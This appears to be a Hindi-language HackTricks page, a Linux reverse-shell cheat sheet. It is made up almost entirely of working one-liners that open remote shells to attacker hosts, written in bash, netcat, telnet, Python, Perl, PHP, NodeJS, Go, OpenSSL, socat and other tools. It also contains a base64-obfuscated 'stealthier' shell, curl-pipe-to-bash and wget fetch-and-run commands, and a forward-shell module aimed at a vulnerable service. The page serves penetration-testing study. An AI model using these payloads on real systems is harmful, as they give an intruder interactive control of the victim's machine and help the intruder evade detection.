# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**यदि आपको इनमें से किसी भी shell के बारे में प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com/) **पर जाँच सकते हैं।**<sup>[[9]](#references)</sup>

## Full TTY

**एक reverse shell प्राप्त करने के बाद**[ **पूर्ण TTY प्राप्त करने के लिए यह पेज पढ़ें**](full-ttys.md)**।**

नीचे एकत्र किए गए baseline reverse-shell payloads को HighOn.Coffee और PayloadsAllTheThings cheat sheets में भी document किया गया है; किसी एक का चयन करने से पहले target पर interpreter और utility की उपलब्धता verify करें।<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
अन्य shells के साथ भी जांच करना न भूलें: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, और bash।

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell का विवरण

निम्नलिखित बिंदु Bash के documented interactive और redirection behavior का सारांश देते हैं:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: command का यह भाग एक interactive (`-i`) Bash shell शुरू करता है।
2. **`>&`**: command का यह भाग **standard output** (`stdout`) और **standard error** (`stderr`) दोनों को **एक ही destination** पर **redirect करने** के लिए shorthand notation है।
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक special file है जो **निर्दिष्ट IP address और port से TCP connection को represent करती है**।
- **output और error streams को इस file पर redirect करने** से command प्रभावी रूप से interactive shell session का output attacker की machine पर भेजती है।
4. **`0>&1`**: command का यह भाग **standard input (`stdin`) को उसी destination पर redirect करता है जिस पर standard output (`stdout`) है**।

### File में create करके execute करें
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

जब RCE उपलब्ध हो, लेकिन firewall, NAT या outbound filtering के कारण reverse shell blocked हो, तो RCE channel पर forward shell एक semi-interactive session प्रदान कर सकता है।<sup>[[12]](#references)</sup>

इस उद्देश्य के लिए [toboggan](https://github.com/n3rada/toboggan.git) एक recommended tool है, जो command-execution primitive को interactive session में wrap करता है।<sup>[[12]](#references)</sup>

toboggan का उपयोग करने के लिए, अपने target system के RCE context के अनुसार एक Python module बनाएं; इसका module interface `execute(command, timeout)` function की अपेक्षा करता है, जो command output लौटाता है।<sup>[[12]](#references)</sup> उदाहरण के लिए, `nix.py` नामक module की संरचना इस प्रकार हो सकती है:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
toboggan के वर्तमान command-line form का उपयोग करके module चलाएँ:<sup>[[12]](#references)</sup>
```shell
toboggan nix.py
```
यह interactive session शुरू करता है। Built-in Burp Suite backend के लिए, `toboggan --request burp_request.xml` का उपयोग करें; command-wrapper backend के लिए, `toboggan --exec-wrapper '<command_template>'` का उपयोग करें।<sup>[[12]](#references)</sup>

एक अन्य संभावना `IppSec` forward-shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) है।<sup>[[13]](#references)</sup>

आपको निम्नलिखित भागों को modify करना होगा:<sup>[[13]](#references)</sup>

- vulnerable host का URL
- अपने payload का prefix और suffix (यदि कोई हो)
- payload भेजने का तरीका (headers? data? extra info?)

इसके बाद, आप **commands भेज** सकते हैं या full PTY प्राप्त करने के लिए **`upgrade` command** का उपयोग कर सकते हैं; implementation लगभग 1.3-second interval पर output को poll करता है।<sup>[[13]](#references)</sup>

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

BusyBox कई utilities को एक छोटे executable में संयोजित करता है और छोटे या embedded Linux systems में आम है। यदि कोई standalone `nc` न हो, तो जांचें कि क्या BusyBox इसे उपलब्ध कराता है:<sup>[[8]](#references)[[19]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
यदि `busybox nc` मौजूद है लेकिन interactive execution अस्थिर है, तो `nc` section के FIFO pattern को उस applet के अनुसार अनुकूलित करें:<sup>[[2]](#references)[[8]](#references)</sup>
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) पर आधिकारिक deployment instructions देखें।<sup>[[14]](#references)</sup>
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Attacker**
```bash
while true; do nc -l <port>; done
```
Whois section में वर्णित वही Enter/CTRL+D input sequence का उपयोग करें।<sup>[[3]](#references)</sup>

**पीड़ित**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (built-in TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust में लिखा गया आधुनिक netcat-जैसा listener।<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Project द्वारा documented features में शामिल हैं:<sup>[[5]](#references)</sup>
- Interactive mode में Command history और tab completion
- `connect` द्वारा उपयोग किए जाने वाले shell executable को चुनने के लिए `-s`

## pwncat-cs

यदि आपके पास पहले से **कोई भी raw reverse shell** है, लेकिन आप ऐसा listener चाहते हैं जो अधिक उपयोगी session सेट कर सके, तो `pwncat-cs` connection को संभाल सकता है और remote PTY का प्रयास कर सकता है।<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
यह **encrypted** `ssl-bind` और `ssl-connect` channels को भी support करता है, इसलिए जब आपको transport encryption की आवश्यकता हो, तो आप इसे `ncat --ssl` या `socat OPENSSL:` payloads के साथ pair कर सकते हैं।<sup>[[7]](#references)</sup>

## revsh (encrypted & pivot-ready)

`revsh` एक छोटा C client/server है, जो **encrypted Diffie-Hellman tunnel** के ऊपर full TTY प्रदान करता है और reverse VPN-like pivoting के लिए वैकल्पिक रूप से एक **TUN/TAP** interface attach कर सकता है।<sup>[[6]](#references)</sup>
```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```
`revsh` में documented उपयोगी flags में शामिल हैं:<sup>[[6]](#references)</sup>
- `-b`: bind-shell mode (इसे दोनों ends पर enable करें)
- `-D [LHOST:]LPORT` या `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
- `-x`: proxies का automatic setup disable करें, जिसमें default TUN/TAP setup भी शामिल है

यह encrypted tunnel shell traffic को plaintext के रूप में expose होने से बचाता है, लेकिन यह अपने आप network policy को bypass नहीं करता।<sup>[[6]](#references)</sup>

## OpenSSL

यह section certificate बनाने और TLS पर shell ले जाने के लिए OpenSSL के `req`, `s_server`, और `s_client` commands का उपयोग करता है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

हमलावर (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
पीड़ित
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
जब आपको अलग-अलग इनपुट/आउटपुट चैनल चाहिए हों, तब भी आप पारंपरिक **two-listener** pattern का उपयोग कर सकते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**हमलावर**
```bash
while true; do nc -l 79; done
```
कमांड भेजने के लिए उसे लिखें, Enter दबाएँ और STDIN को रोकने के लिए CTRL+D दबाएँ।<sup>[[3]](#references)</sup>

**Victim**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

यह आपके system से port 6001 पर connect करने का प्रयास करेगा।<sup>[[2]](#references)</sup>
```bash
xterm -display 10.0.0.1:1
```
reverse shell पकड़ने के लिए, नीचे दिखाए अनुसार port 6001 पर listening करने वाले X server का उपयोग करें।<sup>[[2]](#references)</sup>
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

द्वारा [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)। नोट: Java reverse shell भी Groovy के लिए काम करता है।<sup>[[18]](#references)</sup>
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash और Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Reverse Shells के लिए Whois और Finger का उपयोग](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - आधुनिक port listener और reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - terminal support, data tunneling और advanced pivoting capabilities वाला reverse shell](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash Reference Manual: Redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash Reference Manual: Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket deployment निर्देश](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
{{#include ../../banners/hacktricks-training.md}}
